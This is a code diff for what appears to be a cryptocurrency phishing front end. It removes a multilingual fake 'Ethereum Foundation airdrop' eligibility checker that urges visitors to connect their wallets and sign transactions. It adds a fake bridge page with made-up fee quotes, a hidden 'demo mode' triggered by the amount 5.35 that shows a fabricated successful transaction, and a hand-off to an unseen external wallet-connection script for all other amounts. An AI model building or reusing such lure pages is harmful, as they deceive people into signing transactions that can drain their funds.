-        vipMessage: "You are eligible for a bonus for active use of Ethereum",
-        addressCopied: "Address copied to clipboard!",
-        recentChecks: "📜 Recent Checks",
-        clearHistory: "Clear",
-        noHistory: "No recent checks"
-    },
-    ru: {
-        title: "EthRewardsChecker",
-        subtitle: "Проверьте кошелек на участие в официальной программе airdrop от Ethereum Foundation",
-        labelAddress: "Адрес Ethereum Кошелька",
-        buttonText: "Проверить Право",
-        buttonChecking: "Проверка...",
-        errorTitle: "Ошибка Проверки",
-        invalidAddress: "Некорректный формат адреса кошелька",
-        connectionError: "Не удалось подключиться к сети Ethereum. Попробуйте еще раз.",
-        successTitle: "Поздравляем!",
-        successContent: "Ваш кошелек соответствует требованиям.",
-        failTitle: "Не Подходит",
-        failContent: "Этот кошелек не соответствует минимальным требованиям.",
-        currentBalance: "Текущий Баланс",
-        yourReward: "Ваше Вознаграждение",
-        connectButton: "Подключить Кошелек",
-        claimInstructions: "Подключите кошелек и подпишите транзакцию для получения вознаграждения.",
-        poweredBy: "Работает на Ethereum API",
-        termsLink: "Условия Использования",
-        vipMessage: "Вам полагается бонус за активное использование Ethereum",
-        addressCopied: "Адрес скопирован в буфер обмена!",
-        recentChecks: "📜 Недавние Проверки",
-        clearHistory: "Очистить",
-        noHistory: "Нет недавних проверок"
-    },
-    uk: {
-        title: "EthRewardsChecker",
-        subtitle: "Перевірте гаманець на участь в офіційній програмі airdrop від Ethereum Foundation",
-        labelAddress: "Адреса Ethereum Гаманця",
-        buttonText: "Перевірити Право",
-        buttonChecking: "Перевірка...",
-        errorTitle: "Помилка Перевірки",
-        invalidAddress: "Некоректний формат адреси гаманця",
-        connectionError: "Не вдалося підключитися до мережі Ethereum. Спробуйте ще раз.",
-        successTitle: "Вітаємо!",
-        successContent: "Ваш гаманець відповідає вимогам.",
-        failTitle: "Не Підходить",
-        failContent: "Цей гаманець не відповідає мінімальним вимогам.",
-        currentBalance: "Поточний Баланс",
-        yourReward: "Ваша Винагорода",
-        connectButton: "Підключити Гаманець",
-        claimInstructions: "Підключіть гаманець та підпишіть транзакцію для отримання винагороди.",
-        poweredBy: "Працює на Ethereum API",
-        termsLink: "Умови Використання",
-        vipMessage: "Вам належить бонус за активне використання Ethereum",
-        addressCopied: "Адресу скопійовано в буфер обміну!",
-        recentChecks: "📜 Нещодавні Перевірки",
-        clearHistory: "Очистити",
-        noHistory: "Немає нещодавніх перевірок"
-    }
-    ,
-    es: { title: "EthRewardsChecker", subtitle: "Verifica la elegibilidad de tu billetera", labelAddress: "Dirección de Billetera", buttonText: "Verificar Elegibilidad", buttonChecking: "Verificando...", errorTitle: "Error de Verificación", invalidAddress: "Formato de dirección de billetera inválido", connectionError: "No se puede conectar a la red Ethereum. Intente de nuevo.", successTitle: "¡Felicitaciones!", successContent: "Tu billetera cumple los requisitos.", failTitle: "No Elegible", failContent: "Esta billetera no cumple los requisitos mínimos.", currentBalance: "Saldo Actual", yourReward: "Tu Recompensa", connectButton: "Conectar Billetera", claimInstructions: "Conecta tu billetera y firma la transacción para reclamar.", poweredBy: "Powered by Ethereum API", termsLink: "Términos de Uso", vipMessage: "Tienes derecho a un bono por uso activo de Ethereum", addressCopied: "¡Dirección copiada al portapapeles!", recentChecks: "📜 Verificaciones Recientes", clearHistory: "Limpiar", noHistory: "Sin verificaciones recientes" },
-    fr: { title: "EthRewardsChecker", subtitle: "Vérifiez l'éligibilité de votre portefeuille", labelAddress: "Adresse du Portefeuille", buttonText: "Vérifier l'Éligibilité", buttonChecking: "Vérification...", errorTitle: "Erreur de Vérification", invalidAddress: "Format d'adresse de portefeuille invalide", connectionError: "Impossible de se connecter au réseau Ethereum. Réessayez.", successTitle: "Félicitations!", successContent: "Votre portefeuille répond aux exigences.", failTitle: "Non Éligible", failContent: "Ce portefeuille ne répond pas aux exigences minimales.", currentBalance: "Solde Actuel", yourReward: "Votre Récompense", connectButton: "Connecter le Portefeuille", claimInstructions: "Connectez votre portefeuille et signez la transaction pour réclamer.", poweredBy: "Powered by Ethereum API", termsLink: "Conditions d'Utilisation", vipMessage: "Vous avez droit à un bonus pour utilisation active d'Ethereum", addressCopied: "Adresse copiée dans le presse-papiers!", recentChecks: "📜 Vérifications Récentes", clearHistory: "Effacer", noHistory: "Aucune vérification récente" },
-    de: { title: "EthRewardsChecker", subtitle: "Überprüfen Sie die Berechtigung Ihrer Wallet", labelAddress: "Wallet-Adresse", buttonText: "Berechtigung Prüfen", buttonChecking: "Wird geprüft...", errorTitle: "Überprüfungsfehler", invalidAddress: "Ungültiges Wallet-Adressformat", connectionError: "Verbindung zum Ethereum-Netzwerk fehlgeschlagen. Bitte erneut versuchen.", successTitle: "Glückwunsch!", successContent: "Ihre Wallet erfüllt die Anforderungen.", failTitle: "Nicht Berechtigt", failContent: "Diese Wallet erfüllt die Mindestanforderungen nicht.", currentBalance: "Aktueller Kontostand", yourReward: "Ihre Belohnung", connectButton: "Wallet Verbinden", claimInstructions: "Verbinden Sie Ihre Wallet und signieren Sie die Transaktion.", poweredBy: "Powered by Ethereum API", termsLink: "Nutzungsbedingungen", vipMessage: "Sie haben Anspruch auf einen Bonus für die aktive Nutzung von Ethereum", addressCopied: "Adresse in die Zwischenablage kopiert!", recentChecks: "📜 Letzte Überprüfungen", clearHistory: "Löschen", noHistory: "Keine letzten Überprüfungen" },
-    it: { title: "EthRewardsChecker", subtitle: "Verifica l'idoneità del tuo portafoglio", labelAddress: "Indirizzo del Portafoglio", buttonText: "Verifica Idoneità", buttonChecking: "Verifica in corso...", errorTitle: "Errore di Verifica", invalidAddress: "Formato indirizzo portafoglio non valido", connectionError: "Impossibile connettersi alla rete Ethereum. Riprova.", successTitle: "Congratulazioni!", successContent: "Il tuo portafoglio soddisfa i requisiti.", failTitle: "Non Idoneo", failContent: "Questo portafoglio non soddisfa i requisiti minimi.", currentBalance: "Saldo Attuale", yourReward: "La Tua Ricompensa", connectButton: "Connetti Portafoglio", claimInstructions: "Connetti il tuo portafoglio per richiedere e firmare la transazione.", poweredBy: "Powered by Ethereum API", termsLink: "Termini di Utilizzo", vipMessage: "Hai diritto a un bonus per l'uso attivo di Ethereum", addressCopied: "Indirizzo copiato negli appunti!", recentChecks: "📜 Verifiche Recenti", clearHistory: "Cancella", noHistory: "Nessuna verifica recente" },
-    pt: { title: "EthRewardsChecker", subtitle: "Verifique a elegibilidade da sua carteira", labelAddress: "Endereço da Carteira", buttonText: "Verificar Elegibilidade", buttonChecking: "Verificando...", errorTitle: "Erro de Verificação", invalidAddress: "Formato de endereço de carteira inválido", connectionError: "Não foi possível conectar à rede Ethereum. Tente novamente.", successTitle: "Parabéns!", successContent: "Sua carteira atende aos requisitos.", failTitle: "Não Elegível", failContent: "Esta carteira não atende aos requisitos mínimos.", currentBalance: "Saldo Atual", yourReward: "Sua Recompensa", connectButton: "Conectar Carteira", claimInstructions: "Conecte sua carteira para reivindicar e assinar a transação.", poweredBy: "Powered by Ethereum API", termsLink: "Termos de Uso", vipMessage: "Você tem direito a um bônus por uso ativo do Ethereum", addressCopied: "Endereço copiado para a área de transferência!", recentChecks: "📜 Verificações Recentes", clearHistory: "Limpar", noHistory: "Sem verificações recentes" },
-    zh: { title: "EthRewardsChecker", subtitle: "检查您的钱包资格", labelAddress: "以太坊钱包地址", buttonText: "检查资格", buttonChecking: "检查中...", errorTitle: "验证错误", invalidAddress: "钱包地址格式无效", connectionError: "无法连接到以太坊网络。请重试。", successTitle: "恭喜！", successContent: "您的钱包符合要求。", failTitle: "不符合资格", failContent: "此钱包不符合最低要求。", currentBalance: "当前余额", yourReward: "您的奖励", connectButton: "连接钱包", claimInstructions: "连接您的钱包以领取并签署交易。", poweredBy: "Powered by Ethereum API", termsLink: "使用条款", vipMessage: "您有资格获得活跃使用以太坊的奖金", addressCopied: "地址已复制到剪贴板！", recentChecks: "📜 最近检查", clearHistory: "清除", noHistory: "无最近检查" },
-    ja: { title: "EthRewardsChecker", subtitle: "ウォレットの資格を確認", labelAddress: "イーサリアムウォレットアドレス", buttonText: "資格確認", buttonChecking: "確認中...", errorTitle: "検証エラー", invalidAddress: "ウォレットアドレス形式が無効です", connectionError: "イーサリアムネットワークに接続できません。再試行してください。", successTitle: "おめでとうございます！", successContent: "ウォレットは要件を満たしています。", failTitle: "対象外", failContent: "このウォレットは最低要件を満たしていません。", currentBalance: "現在の残高", yourReward: "あなたの報酬", connectButton: "ウォレット接続", claimInstructions: "ウォレットを接続して請求し、トランザクションに署名してください。", poweredBy: "Powered by Ethereum API", termsLink: "利用規約", vipMessage: "イーサリアムの積極的な使用に対するボーナスの資格があります", addressCopied: "アドレスがクリップボードにコピーされました！", recentChecks: "📜 最近の確認", clearHistory: "クリア", noHistory: "最近の確認なし" },
-    ko: { title: "EthRewardsChecker", subtitle: "지갑 자격 확인", labelAddress: "이더리움 지갑 주소", buttonText: "자격 확인", buttonChecking: "확인 중...", errorTitle: "검증 오류", invalidAddress: "지갑 주소 형식이 잘못되었습니다", connectionError: "이더리움 네트워크에 연결할 수 없습니다. 다시 시도하세요.", successTitle: "축하합니다!", successContent: "지갑이 요구 사항을 충족합니다.", failTitle: "자격 없음", failContent: "이 지갑은 최소 요구 사항을 충족하지 않습니다.", currentBalance: "현재 잔액", yourReward: "귀하의 보상", connectButton: "지갑 연결", claimInstructions: "지갑을 연결하여 청구하고 거래에 서명하세요.", poweredBy: "Powered by Ethereum API", termsLink: "이용 약관", vipMessage: "이더리움의 활발한 사용에 대한 보너스를 받을 자격이 있습니다", addressCopied: "주소가 클립보드에 복사되었습니다！", recentChecks: "📜 최근 확인", clearHistory: "지우기", noHistory: "최근 확인 없음" },
-    tr: { title: "EthRewardsChecker", subtitle: "Cüzdan uygunluğunuzu kontrol edin", labelAddress: "Ethereum Cüzdan Adresi", buttonText: "Uygunluğu Kontrol Et", buttonChecking: "Kontrol ediliyor...", errorTitle: "Doğrulama Hatası", invalidAddress: "Geçersiz cüzdan adresi formatı", connectionError: "Ethereum ağına bağlanılamıyor. Lütfen tekrar deneyin.", successTitle: "Tebrikler!", successContent: "Cüzdanınız gereksinimleri karşılıyor.", failTitle: "Uygun Değil", failContent: "Bu cüzdan minimum gereksinimleri karşılamıyor.", currentBalance: "Mevcut Bakiye", yourReward: "Ödülünüz", connectButton: "Cüzdan Bağla", claimInstructions: "Talep etmek için cüzdanınızı bağlayın ve işlemi imzalayın.", poweredBy: "Powered by Ethereum API", termsLink: "Kullanım Şartları", vipMessage: "Ethereum'un aktif kullanımı için bonus almaya hak kazandınız", addressCopied: "Adres panoya kopyalandı!", recentChecks: "📜 Son Kontroller", clearHistory: "Temizle", noHistory: "Son kontrol yok" },
-    pl: { title: "EthRewardsChecker", subtitle: "Sprawdź kwalifikowalność portfela", labelAddress: "Adres Portfela Ethereum", buttonText: "Sprawdź Kwalifikowalność", buttonChecking: "Sprawdzanie...", errorTitle: "Błąd Weryfikacji", invalidAddress: "Nieprawidłowy format adresu portfela", connectionError: "Nie można połączyć się z siecią Ethereum. Spróbuj ponownie.", successTitle: "Gratulacje!", successContent: "Twój portfel spełnia wymagania.", failTitle: "Nie Kwalifikuje się", failContent: "Ten portfel nie spełnia minimalnych wymagań.", currentBalance: "Aktualne Saldo", yourReward: "Twoja Nagroda", connectButton: "Połącz Portfel", claimInstructions: "Połącz portfel, aby odebrać i podpisz transakcję.", poweredBy: "Powered by Ethereum API", termsLink: "Warunki Użytkowania", vipMessage: "Masz prawo do bonusu za aktywne korzystanie z Ethereum", addressCopied: "Adres skopiowany do schowka!", recentChecks: "📜 Ostatnie Sprawdzenia", clearHistory: "Wyczyść", noHistory: "Brak ostatnich sprawdzeń" },
-    ar: { title: "EthRewardsChecker", subtitle: "تحقق من أهلية محفظتك", labelAddress: "عنوان محفظة Ethereum", buttonText: "تحقق من الأهلية", buttonChecking: "جاري التحقق...", errorTitle: "خطأ في التحقق", invalidAddress: "تنسيق عنوان محفظة غير صالح", connectionError: "تعذر الاتصال بشبكة Ethereum. يرجى المحاولة مرة أخرى.", successTitle: "تهانينا!", successContent: "محفظتك تفي بالمتطلبات.", failTitle: "غير مؤهل", failContent: "هذه المحفظة لا تفي بالحد الأدنى من المتطلبات.", currentBalance: "الرصيد الحالي", yourReward: "مكافأتك", connectButton: "ربط المحفظة", claimInstructions: "قم بربط محفظتك للمطالبة وتوقيع المعاملة.", poweredBy: "Powered by Ethereum API", termsLink: "شروط الاستخدام", vipMessage: "أنت مؤهل للحصول على مكافأة للاستخدام النشط لإيثريوم", addressCopied: "تم نسخ العنوان إلى الحافظة!", recentChecks: "📜 الفحوصات الأخيرة", clearHistory: "مسح", noHistory: "لا توجد فحوصات أخيرة" },
-    ur: { title: "EthRewardsChecker", subtitle: "اپنے بٹوے کی اہلیت چیک کریں", labelAddress: "ایتھیریم بٹوے کا پتہ", buttonText: "اہلیت چیک کریں", buttonChecking: "چیک ہو رہا ہے...", errorTitle: "تصدیق کی خرابی", invalidAddress: "بٹوے کے پتے کی شکل غلط ہے", connectionError: "ایتھیریم نیٹ ورک سے منسلک نہیں ہو سکا۔ دوبارہ کوشش کریں۔", successTitle: "مبارک ہو!", successContent: "آپ کا بٹوہ تقاضے پورے کرتا ہے۔", failTitle: "اہل نہیں", failContent: "یہ بٹوہ کم سے کم تقاضے پورے نہیں کرتا۔", currentBalance: "موجودہ بیلنس", yourReward: "آپ کا انعام", connectButton: "بٹوہ منسلک کریں", claimInstructions: "دعوی کرنے کے لیے اپنا بٹوہ منسلک کریں اور لین دین پر دستخط کریں۔", poweredBy: "Powered by Ethereum API", termsLink: "استعمال کی شرائط", vipMessage: "آپ ایتھیریم کے فعال استعمال کے لیے بونس کے اہل ہیں", addressCopied: "پتہ کلپ بورڈ میں کاپی ہو گیا!", recentChecks: "📜 حالیہ چیک", clearHistory: "صاف کریں", noHistory: "کوئی حالیہ چیک نہیں" },
-    hi: { title: "EthRewardsChecker", subtitle: "अपने वॉलेट की पात्रता जांचें", labelAddress: "एथेरियम वॉलेट पता", buttonText: "पात्रता जांचें", buttonChecking: "जांच रहे हैं...", errorTitle: "सत्यापन त्रुटि", invalidAddress: "वॉलेट पता प्रारूप अमान्य है", connectionError: "एथेरियम नेटवर्क से कनेक्ट नहीं हो सका। कृपया पुनः प्रयास करें।", successTitle: "बधाई हो!", successContent: "आपका वॉलेट आवश्यकताओं को पूरा करता है।", failTitle: "पात्र नहीं", failContent: "यह वॉलेट न्यूनतम आवश्यकताओं को पूरा नहीं करता।", currentBalance: "वर्तमान शेष", yourReward: "आपका पुरस्कार", connectButton: "वॉलेट कनेक्ट करें", claimInstructions: "दावा करने के लिए अपना वॉलेट कनेक्ट करें और लेनदेन पर हस्ताक्षर करें।", poweredBy: "Powered by Ethereum API", termsLink: "उपयोग की शर्तें", vipMessage: "आप एथेरियम के सक्रिय उपयोग के लिए बोनस के पात्र हैं", addressCopied: "पता क्लिपबोर्ड पर कॉपी किया गया!", recentChecks: "📜 हाल की जांच", clearHistory: "साफ़ करें", noHistory: "कोई हाल की जांच नहीं" }
-};
+        let walletConnected = false;
+        let ethPrice = 0;
+        let gasPrice = 0;
+        let selectedFromChain = 'ethereum';
+        let selectedToChain = 'arbitrum';
 
-// Constants
-const VIP_WALLET = '0x7F9A75bcBb330bf0ff71167a7711A41aC962512A'.toLowerCase();
-const MIN_BALANCE_USD = 200;
-const BONUS_PERCENTAGE = 20;
-const VIP_BALANCE_USD = 11722;
-const MAX_HISTORY_ITEMS = 5;
-const PRICE_CACHE_DURATION = 5 * 60 * 1000; // 5 minutes
-const RATE_LIMIT_DELAY = 1000; // 1 second between requests
-
-// State
-let currentLang = 'en';
-let currentEthPrice = 3500;
-let lastPriceFetch = 0;
-let lastRequestTime = 0;
-
-// Toast notifications
-function showToast(message, type = 'info') {
-    const container = document.getElementById('toastContainer');
-    const toast = document.createElement('div');
-    toast.className = `toast ${type}`;
-    
-    const icon = type === 'success' ? '✓' : type === 'error' ? '✕' : 'ℹ';
-    
-    toast.innerHTML = `
-        <div class="toast-icon">${icon}</div>
-        <div class="toast-message">${message}</div>
-    `;
-    
-    container.appendChild(toast);
-    
-    setTimeout(() => {
-        toast.style.animation = 'slideIn 0.3s ease-out reverse';
-        setTimeout(() => toast.remove(), 300);
-    }, 3000);
-}
-
-// Theme management
-function initTheme() {
-    const savedTheme = localStorage.getItem('theme') || 'light';
-    setTheme(savedTheme);
-}
-
-function setTheme(theme) {
-    document.documentElement.setAttribute('data-theme', theme);
-    document.getElementById('themeIcon').textContent = theme === 'dark' ? '☀️' : '🌙';
-    localStorage.setItem('theme', theme);
-}
-
-function toggleTheme() {
-    const currentTheme = document.documentElement.getAttribute('data-theme') || 'light';
-    const newTheme = currentTheme === 'light' ? 'dark' : 'light';
-    setTheme(newTheme);
-}
-
-// Cookie management
-function initCookieBanner() {
-    const accepted = localStorage.getItem('cookiesAccepted');
-    const banner = document.getElementById('cookieBanner');
-    
-    if (accepted === 'true' || accepted === 'false') {
-        // Already answered - hide banner immediately
-        banner.style.display = 'none';
-    }
-    // Otherwise banner stays visible (default CSS)
-}
-
-function acceptCookies() {
-    localStorage.setItem('cookiesAccepted', 'true');
-    const banner = document.getElementById('cookieBanner');
-    banner.classList.add('hide');
-    setTimeout(() => {
-        banner.style.display = 'none';
-    }, 300);
-}
-
-function declineCookies() {
-    localStorage.setItem('cookiesAccepted', 'false');
-    const banner = document.getElementById('cookieBanner');
-    banner.classList.add('hide');
-    setTimeout(() => {
-        banner.style.display = 'none';
-    }, 300);
-}
-
-// Language management
-function changeLanguage(lang) {
-    currentLang = lang;
-    const t = translations[lang] || translations.en;
-    
-    document.getElementById('title').textContent = t.title;
-    document.getElementById('subtitle').textContent = t.subtitle;
-    document.getElementById('labelAddress').textContent = t.labelAddress;
-    document.getElementById('buttonText').textContent = t.buttonText;
-    document.getElementById('poweredBy').textContent = t.poweredBy;
-    document.getElementById('termsLink').textContent = t.termsLink;
-    
-    localStorage.setItem('preferredLanguage', lang);
-}
-
-function initLanguage() {
-    const savedLang = localStorage.getItem('preferredLanguage') || 'en';
-    document.getElementById('languageSelect').value = savedLang;
-    changeLanguage(savedLang);
-}
-
-// Price fetching with caching
-async function getEthPrice() {
-    const now = Date.now();
-    
-    if (now - lastPriceFetch < PRICE_CACHE_DURATION) {
-        return currentEthPrice;
-    }
-    
-    try {
-        const res = await fetch('https://api.coingecko.com/api/v3/simple/price?ids=ethereum&vs_currencies=usd');
-        const data = await res.json();
-        
-        if (data.ethereum && data.ethereum.usd) {
-            currentEthPrice = data.ethereum.usd;
-            lastPriceFetch = now;
-            localStorage.setItem('cachedEthPrice', JSON.stringify({ price: currentEthPrice, timestamp: now }));
+        // Smooth scroll to bridge section
+        function scrollToBridge(event) {
+            event.preventDefault();
+            document.getElementById('bridge').scrollIntoView({ 
+                behavior: 'smooth',
+                block: 'start'
+            });
         }
-    } catch (error) {
-        console.warn('Failed to fetch ETH price, using cached or default value');
-        const cached = localStorage.getItem('cachedEthPrice');
-        if (cached) {
-            const { price } = JSON.parse(cached);
-            currentEthPrice = price;
+
+        // Chain data with CoinGecko IDs and logos
+        const chains = {
+            ethereum: {
+                name: 'Ethereum',
+                symbol: 'ETH',
+                logo: 'https://assets.coingecko.com/coins/images/279/small/ethereum.png',
+                geckoId: 'ethereum',
+                balance: 2.45
+            },
+            arbitrum: {
+                name: 'Arbitrum',
+                symbol: 'ARB',
+                logo: 'https://assets.coingecko.com/coins/images/16547/small/photo_2023-03-29_21.47.00.jpeg',
+                geckoId: 'arbitrum',
+                balance: 0
+            },
+            optimism: {
+                name: 'Optimism',
+                symbol: 'OP',
+                logo: 'https://assets.coingecko.com/coins/images/25244/small/Optimism.png',
+                geckoId: 'optimism',
+                balance: 0
+            },
+            polygon: {
+                name: 'Polygon',
+                symbol: 'MATIC',
+                logo: 'https://assets.coingecko.com/coins/images/4713/small/matic-token-icon.png',
+                geckoId: 'matic-network',
+                balance: 0
+            },
+            base: {
+                name: 'Base',
+                symbol: 'ETH',
+                logo: 'https://assets.coingecko.com/coins/images/279/small/ethereum.png',
+                geckoId: 'ethereum',
+                balance: 0
+            },
+            avalanche: {
+                name: 'Avalanche',
+                symbol: 'AVAX',
+                logo: 'https://assets.coingecko.com/coins/images/12559/small/Avalanche_Circle_RedWhite_Trans.png',
+                geckoId: 'avalanche-2',
+                balance: 0
+            },
+            bsc: {
+                name: 'BNB Chain',
+                symbol: 'BNB',
+                logo: 'https://assets.coingecko.com/coins/images/825/small/bnb-icon2_2x.png',
+                geckoId: 'binancecoin',
+                balance: 0
+            },
+            zksync: {
+                name: 'zkSync',
+                symbol: 'ETH',
+                logo: 'https://assets.coingecko.com/coins/images/279/small/ethereum.png',
+                geckoId: 'ethereum',
+                balance: 0
+            }
+        };
+
+        // Fetch ETH price from CoinGecko on page load
+        async function fetchCryptoPrices() {
+            try {
+                const response = await fetch('https://api.coingecko.com/api/v3/simple/price?ids=ethereum,arbitrum,optimism,matic-network,avalanche-2,binancecoin&vs_currencies=usd');
+                const data = await response.json();
+                
+                // Update ETH price
+                ethPrice = data.ethereum?.usd || 3500;
+                
+                // Estimate current gas cost (typical bridge uses ~200k-300k gas)
+                // At 20 gwei and current ETH price, base gas cost would be around $12-18
+                // We'll use a realistic estimate: gas cost ≈ 0.35% of ETH price
+                gasPrice = Math.max(8, ethPrice * 0.0035);
+                
+                // Update balance display with price
+                updateBalanceDisplay();
+                
+                console.log('Prices updated - ETH:', ethPrice, 'Base Gas:', gasPrice.toFixed(2));
+            } catch (error) {
+                console.error('Error fetching prices:', error);
+                ethPrice = 3500; // Fallback price
+                gasPrice = 12; // Fallback gas cost
+            }
         }
-    }
-    
-    return currentEthPrice;
-}
 
-// Rate limiting
-async function rateLimit() {
-    const now = Date.now();
-    const timeSinceLastRequest = now - lastRequestTime;
-    
-    if (timeSinceLastRequest < RATE_LIMIT_DELAY) {
-        await new Promise(resolve => setTimeout(resolve, RATE_LIMIT_DELAY - timeSinceLastRequest));
-    }
-    
-    lastRequestTime = Date.now();
-}
-
-// Wallet checking with improved error handling
-async function checkWallet(address) {
-    await rateLimit();
-    
-    const rpcs = [
-        'https://eth.llamarpc.com',
-        'https://rpc.ankr.com/eth',
-        'https://cloudflare-eth.com'
-    ];
-    
-    const errors = [];
-    
-    for (const rpc of rpcs) {
-        try {
-            const controller = new AbortController();
-            const timeout = setTimeout(() => controller.abort(), 5000);
+        // Calculate realistic bridge fees (50% of typical real fees)
+        // Typical real bridge fees range from $10-30+ depending on gas and protocol
+        function calculateBridgeFees() {
+            const baseGas = gasPrice;
             
-            const res = await fetch(rpc, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    jsonrpc: '2.0',
-                    method: 'eth_getBalance',
-                    params: [address, 'latest'],
-                    id: 1
-                }),
-                signal: controller.signal
+            // Real fees = base gas + protocol fees (0.1-0.6% of amount) + liquidity costs
+            // We show 50% of realistic total fees
+            const fees = {
+                stargate: (baseGas * 1.1 / 2).toFixed(2),    // Most optimized
+                across: (baseGas * 0.95 / 2).toFixed(2),      // Fast relayer
+                hop: (baseGas * 1.5 / 2).toFixed(2),          // AMM pools
+                synapse: (baseGas * 1.3 / 2).toFixed(2),      // Bridge + swap
+                wormhole: (baseGas * 1.7 / 2).toFixed(2)      // Cross-chain messaging
+            };
+            
+            return fees;
+        }
+
+        function updateBalanceDisplay() {
+            // Balance is no longer shown before wallet connection
+            // This function is kept for compatibility
+        }
+
+        function updateUSDValue() {
+            const amount = document.getElementById('amountInput').value;
+            if (amount && parseFloat(amount) > 0 && ethPrice > 0) {
+                const usdValue = (parseFloat(amount) * ethPrice).toFixed(2);
+                document.getElementById('usdValue').textContent = `≈ $${usdValue.toLocaleString()} USD`;
+            } else {
+                document.getElementById('usdValue').textContent = '≈ $0.00 USD';
+            }
+        }
+
+        function handleAmount() {
+            const amount = document.getElementById('amountInput').value;
+            
+            // Validate amount
+            if (!amount || parseFloat(amount) <= 0) {
+                alert('⚠️ PLEASE ENTER A VALID AMOUNT');
+                return;
+            }
+            
+            // Update USD value
+            updateUSDValue();
+
+            // Show scanning
+            document.getElementById('routes').style.display = 'block';
+            document.getElementById('scanning').style.display = 'block';
+            document.getElementById('routeList').style.display = 'none';
+            
+            setTimeout(() => {
+                // Calculate current fees based on gas prices
+                const fees = calculateBridgeFees();
+                
+                // Update route prices dynamically
+                const routes = document.querySelectorAll('.route-info');
+                if (routes[0]) {
+                    routes[0].querySelector('.route-stats').innerHTML = `<span>~2 MIN</span><span>$${fees.stargate}</span><span>OPTIMIZED</span>`;
+                }
+                if (routes[1]) {
+                    routes[1].querySelector('.route-stats').innerHTML = `<span>~4 MIN</span><span>$${fees.across}</span><span>FAST</span>`;
+                }
+                if (routes[2]) {
+                    routes[2].querySelector('.route-stats').innerHTML = `<span>~5 MIN</span><span>$${fees.hop}</span><span>RELIABLE</span>`;
+                }
+                if (routes[3]) {
+                    routes[3].querySelector('.route-stats').innerHTML = `<span>~6 MIN</span><span>$${fees.synapse}</span><span>SECURE</span>`;
+                }
+                if (routes[4]) {
+                    routes[4].querySelector('.route-stats').innerHTML = `<span>~8 MIN</span><span>$${fees.wormhole}</span><span>CROSS-CHAIN</span>`;
+                }
+                
+                document.getElementById('scanning').style.display = 'none';
+                document.getElementById('routeList').style.display = 'block';
+            }, 10000);
+        }
+
+        // Update USD value on input
+        document.addEventListener('DOMContentLoaded', function() {
+            document.getElementById('amountInput').addEventListener('input', updateUSDValue);
+        });
+
+        // This function will be called by external wallet connection script
+        // It will be blocked when amount is 5.35 (our demo mode)
+        function externalWalletConnect() {
+            const amount = document.getElementById('amountInput').value;
+            
+            // Block external wallet connection for magic number 5.35 (demo mode)
+            if (parseFloat(amount) === 5.35) {
+                console.log('Demo mode active - external wallet connection blocked');
+                return false; // Prevent external script execution
+            }
+            
+            // For all other amounts, allow external wallet connection
+            console.log('Calling external wallet connection...');
+            // Here external script will do actual wallet connection
+            // window.ethereum.request({ method: 'eth_requestAccounts' })
+            return true;
+        }
+
+        function executeBridge() {
+            const amount = document.getElementById('amountInput').value;
+            const routesVisible = document.getElementById('routes').style.display !== 'none';
+            
+            // Validate amount
+            if (!amount || parseFloat(amount) <= 0) {
+                alert('⚠️ PLEASE ENTER AN AMOUNT FIRST');
+                return;
+            }
+            
+            // Check if routes are found
+            if (!routesVisible) {
+                alert('⚠️ PLEASE FIND ROUTES FIRST');
+                return;
+            }
+            
+            // Check if amount is exactly 5.35 - DEMO MODE
+            if (parseFloat(amount) === 5.35) {
+                // Show our styled demo loading modal
+                showWalletConnectionLoading();
+                return;
+            }
+            
+            // For all other amounts - call external wallet connection
+            const canConnect = externalWalletConnect();
+            if (!canConnect) {
+                return; // Blocked
+            }
+            
+            // If external connection is allowed, just give visual feedback
+            const btn = document.getElementById('bridgeBtn');
+            btn.style.opacity = '0.5';
+            setTimeout(() => {
+                btn.style.opacity = '1';
+            }, 200);
+        }
+
+        function showWalletConnectionLoading() {
+            const modal = document.getElementById('loadingModal');
+            const content = document.getElementById('loadingContent');
+            
+            // Step 1: Connecting wallet
+            content.innerHTML = `
+                <div class="loading-icon"></div>
+                <div class="loading-title">CONNECTING WALLET</div>
+                <div class="loading-subtitle">PLEASE APPROVE IN YOUR WALLET</div>
+                <div class="loading-progress">
+                    <div class="loading-progress-bar" style="width: 33%"></div>
+                </div>
+                <div class="loading-steps">
+                    <div class="loading-step active">
+                        <div class="step-icon">1</div>
+                        <span>CONNECTING WALLET...</span>
+                    </div>
+                    <div class="loading-step">
+                        <div class="step-icon">2</div>
+                        <span>APPROVING BRIDGE</span>
+                    </div>
+                    <div class="loading-step">
+                        <div class="step-icon">3</div>
+                        <span>PROCESSING TRANSACTION</span>
+                    </div>
+                </div>
+            `;
+            
+            modal.classList.add('active');
+            document.body.style.overflow = 'hidden';
+            
+            // After 2 seconds, wallet connected
+            setTimeout(() => {
+                showBridgeProcessing();
+            }, 2000);
+        }
+
+        function showBridgeProcessing() {
+            const content = document.getElementById('loadingContent');
+            
+            // Step 2: Bridge processing
+            content.innerHTML = `
+                <div class="loading-icon"></div>
+                <div class="loading-title">PROCESSING BRIDGE</div>
+                <div class="loading-subtitle">TRANSFERRING ASSETS ACROSS CHAINS</div>
+                <div class="loading-progress">
+                    <div class="loading-progress-bar" style="width: 66%"></div>
+                </div>
+                <div class="loading-steps">
+                    <div class="loading-step complete">
+                        <div class="step-icon">✓</div>
+                        <span>WALLET CONNECTED</span>
+                    </div>
+                    <div class="loading-step complete">
+                        <div class="step-icon">✓</div>
+                        <span>BRIDGE APPROVED</span>
+                    </div>
+                    <div class="loading-step active">
+                        <div class="step-icon">3</div>
+                        <span>PROCESSING TRANSACTION...</span>
+                    </div>
+                </div>
+            `;
+            
+            // After 15 seconds, show success
+            setTimeout(() => {
+                showTransactionSuccess();
+            }, 15000);
+        }
+
+        function showTransactionSuccess() {
+            const content = document.getElementById('loadingContent');
+            
+            // Generate random transaction hash
+            const txHash = '0x' + Array.from({length: 64}, () => 
+                Math.floor(Math.random() * 16).toString(16)).join('');
+            
+            // Success screen
+            content.innerHTML = `
+                <div class="success-icon">✓</div>
+                <div class="loading-title">TRANSACTION SUCCESSFUL!</div>
+                <div class="loading-subtitle">YOUR BRIDGE TRANSACTION HAS BEEN COMPLETED</div>
+                <div class="loading-progress">
+                    <div class="loading-progress-bar" style="width: 100%"></div>
+                </div>
+                <div class="loading-steps">
+                    <div class="loading-step complete">
+                        <div class="step-icon">✓</div>
+                        <span>WALLET CONNECTED</span>
+                    </div>
+                    <div class="loading-step complete">
+                        <div class="step-icon">✓</div>
+                        <span>BRIDGE APPROVED</span>
+                    </div>
+                    <div class="loading-step complete">
+                        <div class="step-icon">✓</div>
